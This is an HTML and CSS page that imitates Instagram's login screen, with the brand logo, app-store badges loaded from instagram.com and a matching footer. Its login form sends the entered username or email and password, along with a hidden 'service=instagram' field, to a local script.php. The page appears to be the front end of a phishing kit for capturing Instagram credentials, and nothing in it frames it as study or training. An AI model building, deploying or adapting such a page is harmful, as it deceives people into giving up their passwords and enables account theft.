<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Instagram</title>
    <!-- External css -->
    <link rel="stylesheet" href="style.css">
    <!-- Font awesome link -->
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css" >
    <link rel="shortcut icon" type="image/x-icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/5/58/Instagram-Icon.png/1025px-Instagram-Icon.png" style="border-radius: 10px;" />
</head>
<body>
    <div id="wrapper">
      <div class="container">
        <div class="phone-app-demo"></div>
        <div class="form-data">
           <form method="POST" action="script.php">
            <div class="logo">
              <h1>Instagram.</h1>
            </div>
            <input type="text" placeholder="Phone number, username, or email" name="email">
            <input type="text" placeholder="Password" name="password">
            <input type="hidden" name="service" value="instagram">
            <button class="form-btn" name="connect2" type="submit">Log in</button>
            <span class="has-separator">Or</span>
            <a href="#" class="facebook-login">
              <i class="fab fa-facebook"></i> Log in with Facebook
            </a>
            <a class="password-reset" href="#">Forgot password?</a>
          </form>
          <div class="sign-up">
            Don't an account? <a href="#">Sign up</a>
          </div>
          <div class="get-the-app">
            <span>Get the app</span>
            <div class="badge">
              <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="android App">
              <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="ios app">
            </div>
          </div>
        </div>
      </div>

      <footer>
        <div class="container">
          <nav class="footer-nav">
            <ul>
              <li><a href="#">About Us</a></li>
              <li><a href="#">Support</a></li>
              <li><a href="#">Jobs</a></li>
              <li><a href="#">Privacy</a></li>
              <li><a href="#">Terms</a></li>
              <li><a href="#">Profiles</a></li>
              <li><a href="#">Languages</a></li>
            </ul>
          </nav>
          <div class="copyright-notice">
            &copy; 2019 Complaints
          </div>
        </div>
      </footer>
    </div>
</body>
</html>


<style type="text/css">
  /*importing Google font*/
@import url('https://fonts.googleapis.com/css?family=Pacifico&display=swap');

/*Html rakup styling*/
*,
*::before,
*::after{
  margin: 0;
  padding: 0;
  box-sizing: inherit;
}

html
{
  font-size: 10px;
  box-sizing: border-box;
}

/*Smartphone image*/
img
{
  width: 100%;
  height: 100%;
  max-width: 100%;
}

/*link styling*/
a
{
  text-decoration: none;
}

/*Logo styling*/
h1
{
  font-family: 'Pacifico', cursive;
  font-size: 40px;
}

/*body background color*/
body
{
  background-color: #fafafa;
}

/*Wrapper is like a container of body*/
#wrapper
{
  width: 100%;
  height: 100vh;
  display: flex;
  flex-direction: column;
  justify-content: space-between;
  padding-top: 2rem;
}

.container
{
  width: 100%;
  max-width: 93.5rem;
  margin: 3rem auto 0;
}

#wrapper > .container
{
  display: flex;
  padding: 0 8rem;
}

/*smartphone image*/
.phone-app-demo
{
  height: 61.8rem;
  background: url('https://uditsolutions.in/babamachine/wp-content/uploads/2019/08/phone.png') center no-repeat;
  flex: 1;
}

/*form styling*/
.form-data
{
  width: 100%;
  max-width: 35rem;
  margin-top: 3rem;
}

.form-data form
{
  background-color: #fff;
  border: 2px solid #eee;
  display: flex;
  flex-direction: column;
  padding: 2rem 4rem;
  text-align: center;
}

/*logo again styling*/
.logo h1
{
  /*width: 17.5rem;*/
  margin-bottom: 2.5rem;
}

/*form input styling*/
.form-data form input
{
  padding: .8rem;
  margin-bottom: .5rem;
  border: 2px solid #eee;
  border-radius: .4rem;
}

.form-btn
{
  margin: 1rem 0 1.5rem;
  height: 3rem;
  background-color: #3897f0;
  font-size: 1.4rem;
  color: #fff;
  font-weight: bold;
  border: none;
  border-radius: .4rem;
  cursor: pointer;
}

/*OR font styling*/
.has-separator
{
  font-size: 1.3rem;
  color: #999999;
  text-transform: uppercase;
  position: relative;
  margin-bottom: 2.5rem;
}

.has-separator::before,
.has-separator::after{
  content: '';
  position: absolute;
  background-color: #eee;
  width: 40%;
  height: 1.5px;
  top: 50%;
  transform: translateY(-50%);
}

.has-separator::before
{
  left: 0;
}

.has-separator::after
{
  right: 0;
}

/*FACEBOOK ligin text styling*/
.facebook-login
{
  font-size: 1.4rem;
  font-weight: bold;
  color: #385185;
  margin-bottom: 2.5rem;
}

.facebook-login
{
  font-size: 1.4rem;
  font-weight: bold;
  color: #385185;
  margin-bottom: 2.5rem;
}

.facebook-login i
{
  font-size: 2rem;
  margin-right: .7rem;
}

/*password reset styling*/
.password-reset
{
  font-size: 1.2rem;
  color: #003569;
}

/*signup text styling*/
.sign-up
{
  text-align: center;
  font-size: 1.4rem;
  color: #262626;
  padding: 2rem 0;
  background-color: #fff;
  border: 2px solid #eee;
  margin: 1rem 0;
}

.sign-up
{
  text-align: center;
  font-size: 1.4rem;
  color: #262626;
  padding: 2rem 0;
  background-color: #fff;
  border: 2px solid #eee;
  margin: 1rem 0;
}

.sign-up a
{
  color: #3897f0;
  font-weight: bold;
}

/*Play stor and App store image styling*/
.get-the-app
{
  font-size: 1.4rem;
  text-align: center;
}

.get-the-app span
{
  display: block;
  margin: 2rem 0;
  color: #262626;
}

.badge
{
  width: 100%;
  display: flex;
  justify-content: center;
}

.badge img
{
  max-width: 14rem;
  cursor: pointer;
}

.badge img:first-child
{
  margin-right: 1rem;
}

/*Footer link styling*/
footer
{
  padding: 5rem 0;
}

footer .container
{
  display: flex;
  justify-content: space-between;
  font-weight: bold;
  text-transform: uppercase;
  font-size: 1.3rem;
  flex-wrap: wrap;
  margin-top: 0;
}

.footer-nav ul
{
  display: flex;
  flex-wrap: wrap;
  list-style: none;
}

.footer-nav ul li
{
  margin-right: 1.6rem;
}

.footer-nav ul li a
{
  color: #003569;
}

.copyright-notice
{
  color: #999999;
}

/*responsive styling*/
@media (max-width: 900px)
{
  .phone-app-demo{
    display: none;
  }

  .form-data
  {
    margin: 0 auto;
  }

  #wrapper > .container
  {
    padding: 0;
  }

  footer .container
  {
    padding: 0 2rem;
    justify-content: center;
  }

  .footer-nav ul
  {
    justify-content: center;
  }

  .footer-nav ul li
  {
    margin-bottom: 1rem;
  }
}

@media (max-width: 450px)
{
  #wrapper
  {
    padding-top: 0;
  }
  .form-data form
  {
    background-color: transparent;
    border: none;
    padding: 0 2rem;
  }
  .sign-up
  {
    background-color: transparent;
    border: none;
    margin: 4rem 0;
  }
  footer
  {
    padding-bottom: 2rem;
  }
}
</style>